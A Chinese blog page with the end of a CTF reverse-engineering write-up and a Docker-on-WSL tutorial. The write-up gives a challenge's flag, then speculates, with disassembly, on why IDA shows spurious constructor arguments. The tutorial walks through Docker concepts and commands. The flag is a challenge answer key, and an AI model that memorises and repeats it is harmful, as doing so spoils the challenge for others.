<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;4367FB5F42C6E46B2AF79BF409FB84D3&#125;</span><br></pre></td></tr></table></figure>
<h3 id="胡思乱想">胡思乱想</h3>
<p>为什么ida会多此一举地创建多个副本呢?</p>
<p>以ida在main函数刚开始时创建的两个vector对象为例</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">std::vector&lt;int&gt;::vector(v20, argv, envp);</span><br><span class="line">std::vector&lt;bool&gt;::vector(v19);</span><br></pre></td></tr></table></figure>
<p>显然v20和v19是作为句柄用的,两句话实际上相当于</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vector&lt;int&gt; v20(argv,envp);</span><br><span class="line">vector&lt;bool&gt; v19;</span><br></pre></td></tr></table></figure>
<p>然而我从来也没有见过传递两个字符串数组指针给vector的构造函数</p>
<blockquote>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">vector</span>():<span class="comment">//创建一个空vector</span></span><br><span class="line"><span class="built_in">vector</span>(<span class="type">int</span> nSize):<span class="comment">//创建一个vector,元素个数为nSize</span></span><br><span class="line"><span class="built_in">vector</span>(<span class="type">int</span> nSize,<span class="type">const</span> t&amp; t):<span class="comment">//创建一个vector，元素个数为nSize,且值均为t</span></span><br><span class="line"><span class="built_in">vector</span>(<span class="type">const</span> vector&amp;):<span class="comment">//复制构造函数</span></span><br><span class="line"><span class="built_in">vector</span>(begin,end)<span class="comment">//:复制[begin,end)区间内另一个数组的元素到vector</span></span><br></pre></td></tr></table></figure>
</blockquote>
<p>后面这个<code>vector&lt;bool&gt; v19</code>更离谱,自从创建了它,后面从来没有使用过,在main函数结尾处调用了它的析构函数</p>
<p>为什么会发生这种诡异的情况呢?只能做一个推测</p>
<p>看一下main函数的开端</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">push    rbp</span><br><span class="line">mov     rbp, rsp</span><br><span class="line">push    rbx</span><br><span class="line">sub     rsp, 138h</span><br><span class="line">mov     [rbp+var_14], 0</span><br><span class="line">lea     rax, [rbp+var_B0]</span><br><span class="line">mov     rdi, rax</span><br><span class="line">call    _ZNSt6vectorIiSaIiEEC2Ev ; std::vector&lt;int&gt;::vector(void)</span><br><span class="line">lea     rax, [rbp+var_E0]</span><br><span class="line">mov     rdi, rax</span><br><span class="line">call    _ZNSt6vectorIbSaIbEEC2Ev ; std::vector&lt;bool&gt;::vector(void)</span><br><span class="line">lea     rax, [rbp+var_91]</span><br><span class="line">mov     rdi, rax</span><br></pre></td></tr></table></figure>
<p>本来创建一个vector容器的结构应该是</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">lea     rax, [rbp+var_B0]</span><br><span class="line">mov     rdi, rax</span><br><span class="line">call    _ZNSt6vectorIiSaIiEEC2Ev</span><br></pre></td></tr></table></figure>
<p>栈上var_B0应该是句柄的位置,通过rax中转将var_B0的地址放到rdi里,rdi用来传递参数给<code>_ZNSt6vectorIiSaIiEEC2Ev</code></p>
<p>可是这只是交代了vector对象的句柄应该放在哪,并没有指明参数,这意味着只是创建了一个vector<int>对象,没有传递参数</p>
<p>但是ida不认为它没有参数.</p>
<p>他看见前面有两个push压栈,认为是在准备参数,也没管中间还有sub指令导致的栈变化</p>
<p>(因为正常函数调用的时候,准备参数过程中啃腚不会瞎改栈顶指针,可能ida就直接寻找push指令了,根本不管其他指令的事情)</p>
<p>ida认为,在执行<code>call _ZNSt6vectorIiSaIiEEC2Ev</code>时,刚才压栈的push
rbp和push rbx是保存的调用者main函数的寄存器</p>
<p>一下可能是ida在想什么:</p>
<p>rbp是main函数的栈帧指针,它指向的正是<code>main</code>的最后一个参数<code>envp</code></p>
<p>rbx也不知道ida是怎么认为它存放的是<code>argc</code>数组的</p>
<p>反正它就这样认为的,两个push是在为<code>vector</code>准备参数</p>
<p>于是F5反编译的时候他就堂而皇之地写了一个</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">std::vector&lt;<span class="type">int</span>&gt;::<span class="built_in">vector</span>(v20, argv, envp);</span><br></pre></td></tr></table></figure>
<p>那为啥第二次<code>vector&lt;bool&gt;</code>的时候就没有乱写参数呢?</p>
<p>推测因为ida从最近刚调用函数开始计算当前函数的参数是啥,而两次函数调用之间没有压栈操作</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">call    _ZNSt6vectorIiSaIiEEC2Ev ; std::vector&lt;int&gt;::vector(void)</span><br><span class="line">lea     rax, [rbp+var_E0]</span><br><span class="line">mov     rdi, rax</span><br><span class="line">call    _ZNSt6vectorIbSaIbEEC2Ev ; std::vector&lt;bool&gt;::vector(void)</span><br></pre></td></tr></table></figure>
<p>因此ida认为后来这个vector是无参的</p>
<blockquote>
<p>看雪论坛上大佬的解释是</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220727213433217.png"
alt="image-20220727213433217" />
<figcaption aria-hidden="true">image-20220727213433217</figcaption>
</figure>
<p>我猜ida有时判断不准要几个参数,有可能是调用者和被调用者的调用约定不同,比如cdecl的main函数调用thiscall的构造函数.</p>
<p>学了堆栈平衡再回来看吧</p>
</blockquote>
<p>那为啥有一个<code>vector&lt;bool&gt;</code>后来却从来不用他?</p>
<p>从反汇编得到的指令来看,确实是有调用<code>vector&lt;bool&gt;</code>的构造函数的,可能是出题的为了混淆视听吧</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://deutschball.github.io/2022/07/24/Docker/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="https://raw.githubusercontent.com/DeutschBall/picbed/main/dustball.png">
      <meta itemprop="name" content="dustball">
      <meta itemprop="description" content="dustland">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="dustland">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/07/24/Docker/" class="post-title-link" itemprop="url">Docker@wsl</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2022-07-24 22:33:00" itemprop="dateCreated datePublished" datetime="2022-07-24T22:33:00+08:00">2022-07-24</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2023-10-16 22:46:10" itemprop="dateModified" datetime="2023-10-16T22:46:10+08:00">2023-10-16</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="dockerwsl">Docker@wsl</h1>
<h2 id="docker是什么">docker是什么?</h2>
<p>docker相对于虚拟机是更新一代的虚拟化技术</p>
<p><a
target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/487824422">Docker和虚拟机的区别？ -
知乎 (zhihu.com)</a></p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/v2-9e4980b5c77243ed64760574cd3cdfb9_1440w.jpg"
alt="img" />
<figcaption aria-hidden="true">img</figcaption>
</figure>
<p>基础设施就是笔记本电脑</p>
<p>主操作系统就是windows11</p>
<p>Hypervisor虚拟机管理系统比如windows的Hyper-V,还有VMWare,VritualBox等等</p>
<p>从操作系统就是虚拟机,比如VMWare上的windows server
2003,又如Hyper-V上的WSL.</p>
<p>每个从操作系统都占有独立的内存,CPU等硬件资源.这体现在VMware虚拟机或者WSL运行前可以设置使用CPU数量,内存大小等待</p>
<p>在Docker中,Docker守护进程取代了虚拟机管理类系统,docker是运行在操作系统之上的后台进程,管理docker容器</p>
<p>所有Docker容器都经过Docker守护进程使用CPU,内存等硬件资源.而守护进程是主操作系统的一个后台进程,受主操作系统的调度.</p>
<p>简单的说,docker就是更先进的更轻量级的虚拟技术?</p>
<h3 id="docker四个核心组件">docker四个核心组件</h3>
<p>docker的四个核心组件:</p>
<p>客户端与服务器</p>
<p>镜像</p>
<p>仓库</p>
<p>容器</p>
<h4 id="cs体系">C/S体系</h4>
<p>docker可以作为工作站使用,也可以作为客户端使用.</p>
<p>就是计网中的C/S模型</p>
<h4 id="docker镜像">docker镜像</h4>
<p>"一个docker镜像可以包含一个完整的ubuntu操作系统环境,里面仅安装了Apache或用户需要的其他应用程序"</p>
<p>可以类比.exe文件,exe在磁盘中躺着的时候,就是一个文件.但是加载进入内存之后就成了进程映像.</p>
<p>docker镜像和.exe文件一个性质,而docker容器和进程映像一个性质</p>
<p>docker镜像是只读的,这好理解,就好比一个已经编译链接生成的.exe文件也是只读的一个道理.因为它就没有被改变的理由.如果要"修改"docker镜像,只能是重新生成或者制作</p>
<h4 id="docker容器">docker容器</h4>
<p>容器是从镜像创建的运行实例.</p>
<p>镜像是一个静态概念,而容器就是一个动态概念</p>
<table>
<thead>
<tr>
<th>docker中的概念</th>
<th>目标文件中的概念</th>
</tr>
</thead>
<tbody>
<tr>
<td>docker镜像</td>
<td>文件系统中的.exe文件</td>
</tr>
<tr>
<td>docker容器</td>
<td>内存中的进程映像</td>
</tr>
</tbody>
</table>
<p>到此不禁要考虑一个问题,如果本次在docker容器中写了一个test.txt文件并保存,</p>
<p>关机之后,下次再启动这个docker容器,这个test.txt还存在吗?如果存在,显然是保存在了磁盘中,保存在那里了?docker镜像中吗?还是主操作系统中?</p>
<p>如果导出这个容器,制作一个新镜像,然后新镜像导入成其他电脑的docker容器,那么这个容器中还有test.txt吗?</p>
<p>实际上docker在镜像上面还有一可写入层,镜像被多个容器共用,每个容器创建后私自的改动写入自己的可写入层</p>
<h4 id="docker仓库">docker仓库</h4>
<p>集中存放docker镜像文件的地方</p>
<blockquote>
<p>仓库的概念可以类比git,有本地的git仓库,也有远程的公共仓库服务器github,gitee</p>
<table>
<thead>
<tr>
<th>docker概念</th>
<th>git概念</th>
</tr>
</thead>
<tbody>
<tr>
<td>docker镜像</td>
<td>仓库中的文件</td>
</tr>
<tr>
<td>docker本地仓库</td>
<td>git本地仓库</td>
</tr>
<tr>
<td>docker远程仓库</td>
<td>github中的仓库</td>
</tr>
<tr>
<td>docker注册仓库服务器</td>
<td>github</td>
</tr>
</tbody>
</table>
</blockquote>
<h4 id="四组件关系">四组件关系</h4>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220722201232759.png"
alt="image-20220722201232759" />
<figcaption aria-hidden="true">image-20220722201232759</figcaption>
</figure>
<p>现阶段用不到Dockerfile,甚至Docker仓库也只是白嫖一下官方的镜像,上传什么的以后再说</p>
<h2 id="wsl上使用docker">wsl上使用docker</h2>
<p>ubuntu wsl上的docker安装见</p>
<p><a
target="_blank" rel="noopener" href="https://blog.csdn.net/lupengfei1009/article/details/94637398">window10下子系统ubuntu安装Docker</a></p>
<h3 id="换docker下载源">换docker下载源</h3>
<p>在使用docker之前,先把下载源换成国内源,会方便很多</p>
<p>如果梯子流量管够并且梯子够快,当然不用换下载源.</p>
<p>这里换元不是指wsl的apt命令下载源,也不是指docker中容器的apt命令下载源.</p>
<p>而是<strong>指docker从哪里拉取镜像</strong></p>
<p>在wsl中<code>vim /etc/docker/daemon.json</code></p>
<p>然后添加下载源</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;registry-mirrors&quot;: [</span><br><span class="line">    &quot;https://hub-mirror.c.163.com&quot;,</span><br><span class="line">    &quot;https://ustc-edu-cn.mirror.aliyuncs.com&quot;,</span><br><span class="line">    &quot;https://ghcr.io&quot;,</span><br><span class="line">    &quot;https://mirror.baidubce.com&quot;</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>保存后重启docker服务</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service docker restart</span><br></pre></td></tr></table></figure>
<h3 id="docker命令">docker命令</h3>
<h4 id="docker基本命令">docker基本命令</h4>
<h5 id="版本信息">版本信息</h5>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker version</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">root@Executor:/home/docker# docker version</span><br><span class="line">Client: Docker Engine - Community</span><br><span class="line"> Version:           20.10.17</span><br><span class="line"> API version:       1.41</span><br><span class="line"> Go version:        go1.17.11</span><br><span class="line"> Git commit:        100c701</span><br><span class="line"> Built:             Mon Jun  6 23:02:57 2022</span><br><span class="line"> OS/Arch:           linux/amd64</span><br><span class="line"> Context:           default</span><br><span class="line"> Experimental:      true</span><br><span class="line"></span><br><span class="line">Server: Docker Engine - Community</span><br><span class="line"> Engine:</span><br><span class="line">  Version:          20.10.17</span><br><span class="line">  API version:      1.41 (minimum version 1.12)</span><br><span class="line">  Go version:       go1.17.11</span><br><span class="line">  Git commit:       a89b842</span><br><span class="line">  Built:            Mon Jun  6 23:01:03 2022</span><br><span class="line">  OS/Arch:          linux/amd64</span><br><span class="line">  Experimental:     false</span><br><span class="line"> containerd:</span><br><span class="line">  Version:          1.6.6</span><br><span class="line">  GitCommit:        10c12954828e7c7c9b6e0ea9b0c02b01407d3ae1</span><br><span class="line"> runc:</span><br><span class="line">  Version:          1.1.2</span><br><span class="line">  GitCommit:        v1.1.2-0-ga916309</span><br><span class="line"> docker-init:</span><br><span class="line">  Version:          0.19.0</span><br><span class="line">  GitCommit:        de40ad0</span><br></pre></td></tr></table></figure>
<h5 id="系统信息">系统信息</h5>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">root@Executor:/home/docker# docker info</span><br><span class="line">Client:</span><br><span class="line"> Context:    default</span><br><span class="line"> Debug Mode: false</span><br><span class="line"> Plugins:</span><br><span class="line">  app: Docker App (Docker Inc., v0.9.1-beta3)</span><br><span class="line">  buildx: Docker Buildx (Docker Inc., v0.8.2-docker)</span><br><span class="line">  scan: Docker Scan (Docker Inc., v0.17.0)</span><br><span class="line"></span><br><span class="line">Server:</span><br><span class="line"> Containers: 1</span><br><span class="line">  Running: 1</span><br><span class="line">  Paused: 0</span><br><span class="line">  Stopped: 0</span><br><span class="line"> Images: 3</span><br><span class="line"> Server Version: 20.10.17</span><br><span class="line"> Storage Driver: overlay2</span><br><span class="line">  Backing Filesystem: extfs</span><br><span class="line">  Supports d_type: true</span><br><span class="line">  Native Overlay Diff: true</span><br><span class="line">  userxattr: false</span><br><span class="line"> Logging Driver: json-file</span><br><span class="line"> Cgroup Driver: cgroupfs</span><br><span class="line"> Cgroup Version: 1</span><br><span class="line"> Plugins:</span><br><span class="line">  Volume: local</span><br><span class="line">  Network: bridge host ipvlan macvlan null overlay</span><br><span class="line">  Log: awslogs fluentd gcplogs gelf journald json-file local logentries splunk syslog</span><br><span class="line"> Swarm: inactive</span><br><span class="line"> Runtimes: io.containerd.runc.v2 io.containerd.runtime.v1.linux runc</span><br><span class="line"> Default Runtime: runc</span><br><span class="line"> Init Binary: docker-init</span><br><span class="line"> containerd version: 10c12954828e7c7c9b6e0ea9b0c02b01407d3ae1</span><br><span class="line"> runc version: v1.1.2-0-ga916309</span><br><span class="line"> init version: de40ad0</span><br><span class="line"> Security Options:</span><br><span class="line">  seccomp</span><br><span class="line">   Profile: default</span><br><span class="line"> Kernel Version: 5.10.102.1-microsoft-standard-WSL2		;wsl系统内核版本信息</span><br><span class="line"> Operating System: Ubuntu 20.04.4 LTS			;wsl的操作系统信息</span><br><span class="line"> OSType: linux</span><br><span class="line"> Architecture: x86_64</span><br><span class="line"> CPUs: 8</span><br><span class="line"> Total Memory: 3.831GiB</span><br><span class="line"> Name: Executor</span><br><span class="line"> ID: 7LD5:E4VA:BGYO:LUWX:AUSB:2MM2:2RI2:DULK:QK6O:YFNA:REKG:CUFA</span><br><span class="line"> Docker Root Dir: /var/lib/docker</span><br><span class="line"> Debug Mode: false</span><br><span class="line"> Registry: https://index.docker.io/v1/</span><br><span class="line"> Labels:</span><br><span class="line"> Experimental: false</span><br><span class="line"> Insecure Registries:</span><br><span class="line">  127.0.0.0/8</span><br><span class="line"> Registry Mirrors:</span><br><span class="line">  https://hub-mirror.c.163.com/</span><br><span class="line">  https://ustc-edu-cn.mirror.aliyuncs.com/</span><br><span class="line">  https://ghcr.io/</span><br><span class="line">  https://mirror.baidubce.com/</span><br><span class="line"> Live Restore Enabled: false</span><br><span class="line"></span><br><span class="line">WARNING: No blkio throttle.read_bps_device support</span><br><span class="line">WARNING: No blkio throttle.write_bps_device support</span><br><span class="line">WARNING: No blkio throttle.read_iops_device support</span><br><span class="line">WARNING: No blkio throttle.write_iops_device support</span><br></pre></td></tr></table></figure>
<h4 id="docker镜像的使用">docker镜像的使用</h4>
<h5 id="查找注册仓库中的镜像">查找注册仓库中的镜像</h5>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker search &lt;镜像&gt;</span><br></pre></td></tr></table></figure>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@Executor:/home/docker# docker search httpd</span><br><span class="line">NAME                                 DESCRIPTION                                     STARS     OFFICIAL   AUTOMATED</span><br><span class="line">httpd                                The Apache HTTP Server Project                  4090      [OK]</span><br><span class="line">centos/httpd-24-centos7              Platform <span class="keyword">for</span> running Apache httpd 2.4 or bui…   44</span><br><span class="line">centos/httpd                                                                         35                   [OK]</span><br><span class="line">clearlinux/httpd                     httpd HyperText Transfer Protocol (HTTP) ser…   2</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>其中STARS表明该镜像的权威性</p>
<p>OFFICIAL表明该镜像是否为官方镜像</p>
<h5 id="从仓库拉取镜像">从仓库拉取镜像</h5>
<p>要私人定制一个花里胡哨的ubuntu镜像,首先得有一个干净的基础镜像</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull &lt;仓库名&gt;:&lt;标签&gt;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>这里仓库名一般就是操作系统名比如ubuntu,标签就是操作系统版本比如20.04</p>
<p>因为docker仓库一般以操作系统命名,其中的镜像文件一般以对应操作系统版本号命名</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">root@Executor:~# docker pull ubuntu:20.04</span><br><span class="line">20.04: Pulling from library/ubuntu</span><br><span class="line">d7bfe07ed847: Pull complete</span><br><span class="line">Digest: sha256:fd92c36d3cb9b1d027c4d2a72c6bf0125da82425fc2ca37c414d4f010180dc19</span><br><span class="line">Status: Downloaded newer image for ubuntu:20.04</span><br><span class="line">docker.io/library/ubuntu:20.04</span><br></pre></td></tr></table></figure>
<h5 id="查看本地镜像列表">查看本地镜像列表</h5>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@Executor:~# docker images</span><br><span class="line">REPOSITORY                    TAG       IMAGE ID       CREATED       SIZE</span><br><span class="line">ubuntu                        20.04     20fffa419e3a   6 weeks ago   72.8MB</span><br><span class="line">ansible/ubuntu14.04-ansible   latest    4621d4fe2959   6 years ago   461MB</span><br></pre></td></tr></table></figure>
<table>
<thead>
<tr>
<th>栏目</th>
<th>意义</th>
</tr>
</thead>
<tbody>
<tr>
<td>RESPOSITORY</td>
<td>镜像仓库源</td>
</tr>
<tr>
<td>TAG</td>
<td>镜像标签</td>
</tr>
<tr>
<td>IMAGE ID</td>
<td>镜像ID</td>
</tr>
<tr>
<td>CREATED</td>
<td>镜像创建时间</td>
</tr>
<tr>
<td>SIZE</td>
<td>镜像大小</td>
</tr>
</tbody>
</table>
<p>可以使用<code>仓库源:镜像标签</code>来指定一个唯一的镜像,也可以直接使用镜像ID指定一个唯一的镜像</p>
<h5 id="删除本地镜像">删除本地镜像</h5>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker rmi &lt;镜像&gt;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>这里镜像或者是仓库原:镜像标签指定,或者是镜像ID指定</p>
<p>甚至不用输全信息就可以指定唯一一个镜像</p>
<p>比如只输入镜像ID的前两位或者前三位</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">root@Executor:~# docker images</span><br><span class="line">REPOSITORY                    TAG       IMAGE ID       CREATED        SIZE</span><br><span class="line">ubuntu                        20.04     20fffa419e3a   6 weeks ago    72.8MB</span><br><span class="line">ubuntu                        18.04     5a214d77f5d7   9 months ago   63.1MB</span><br><span class="line">ansible/ubuntu14.04-ansible   latest    4621d4fe2959   6 years ago    461MB</span><br><span class="line">root@Executor:~# docker rmi 5a</span><br><span class="line">Untagged: ubuntu:18.04</span><br><span class="line">Untagged: ubuntu@sha256:0fedbd5bd9fb72089c7bbca476949e10593cebed9b1fb9edf5b79dbbacddd7d6</span><br><span class="line">Deleted: sha256:5a214d77f5d747e6ed81632310baa6190301feeb875cf6bf9da560108fa09972</span><br><span class="line">Deleted: sha256:824bf068fd3dc3ad967022f187d85250eb052f61fe158486b2df4e002f6f984e</span><br></pre></td></tr></table></figure>
<p>这里使用<code>ubuntu:18.04</code>镜像的ID号删除,只需要指定前2位</p>
<blockquote>
<p>正在被引用的镜像不能被删除(该镜像有运行容器时不能删除)</p>
</blockquote>
<h5 id="创建镜像">创建镜像</h5>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker commit</span><br></pre></td></tr></table></figure>
<p>在一个ubuntu20.04的<strong>容器中</strong>(不是wsl中,是wsl的docker容器中)安装ssh之后创建镜像,然后使用新镜像创建容器,看看ssh还有没有</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@Executor:/home/docker# docker commit -m=&quot;ssh&quot; -a=&quot;dustball&quot; 49e5c3d8f7c6 ssh/ubuntu</span><br><span class="line">sha256:886ba4c00ba4b506eb6070d729ff9282a5220717153f3fb8a1f20e7b9f69a236</span><br></pre></td></tr></table></figure>
<blockquote>
<p>-m提交描述信息</p>
<p>-a指定作者</p>
<p>ssh/ubuntu:镜像名称</p>
</blockquote>
<p>sha256码表明镜像创建完毕,使用<code>docker images</code>观察本地所有镜像</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@Executor:/home/docker# docker images</span><br><span class="line">REPOSITORY   TAG       IMAGE ID       CREATED          SIZE</span><br><span class="line">ssh/ubuntu   latest    886ba4c00ba4   27 seconds ago   235MB</span><br><span class="line">ubuntu       20.04     20fffa419e3a   6 weeks ago      72.8MB</span><br></pre></td></tr></table></figure>
<p>新镜像ssh/ubuntu显然比安装ssh之前的镜像ubuntu大好多</p>
<p>用新镜像创建容器并尝试运行ssh,发现是有的</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">root@Executor:/home/docker# docker run -it ssh/ubuntu bash</span><br><span class="line">root@2e155d040460:/# ssh</span><br><span class="line">usage: ssh [-46AaCfGgKkMNnqsTtVvXxYy] [-B bind_interface]</span><br><span class="line">           [-b bind_address] [-c cipher_spec] [-D [bind_address:]port]</span><br><span class="line">           [-E log_file] [-e escape_char] [-F configfile] [-I pkcs11]</span><br><span class="line">           [-i identity_file] [-J [user@]host[:port]] [-L address]</span><br><span class="line">           [-l login_name] [-m mac_spec] [-O ctl_cmd] [-o option] [-p port]</span><br><span class="line">           [-Q query_option] [-R address] [-S ctl_path] [-W host:port]</span><br><span class="line">           [-w local_tun[:remote_tun]] destination [command]</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">patchelf --set-interpreter /home/kali/glibc-all-in-one/libs/2.23-0ubuntu3_amd64/ld-2.23.so --set-rpath /home/kali/glibc-all-in-one/libs/2.23-0ubuntu3_amd64 target_file</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ patchelf --set-interpreter /home/kali/glibc-all-in-one/libs/2.23-0ubuntu3_amd64/ld-2.23.so --set-rpath /home/kali/glibc-all-in-one/libs/2.23-0ubuntu3_amd64 test</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h4 id="docker容器的使用">docker容器的使用</h4>
<h5 id="创建删除容器">创建/删除容器</h5>
<p><strong>创建容器</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker create [启动选项] &lt;镜像&gt; [命令行] </span><br></pre></td></tr></table></figure>
<p>比如创建一个终端上交互启动,默认自动执行/bin/bash命令的ubuntu:20.04容器</p>
